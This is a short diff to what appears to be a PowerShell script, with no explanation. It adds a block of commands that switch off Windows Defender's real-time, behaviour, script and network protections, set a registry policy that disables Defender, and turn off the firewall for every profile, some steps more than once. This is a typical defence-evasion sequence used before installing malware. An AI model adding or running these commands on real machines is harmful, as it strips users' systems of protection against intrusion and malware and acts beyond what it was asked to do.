@@ -7,3 +7,18 @@ Set-MpPreference -DisableScriptScanning $true;
 Set-MpPreference -DisableIntrusionPreventionSystem $true;
 Set-MpPreference -DisableIOAVProtection $true;
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
+Set-MpPreference -DisableRealtimeMonitoring $true;
+Set-MpPreference -DisableBehaviorMonitoring $true;
+Set-MpPreference -DisableBlockAtFirstSeen $true;
+Set-MpPreference -DisableIOAVProtection $true;
+Set-MpPreference -DisableScriptScanning $true;
+Set-MpPreference -DisableIntrusionPreventionSystem $true;
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1;
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
+Set-NetFirewallProfile -Profile Public -Enabled False;
+Set-NetFirewallProfile -Profile Private -Enabled False;
+Set-NetFirewallProfile -Profile Domain -Enabled False;
+
+
+
+
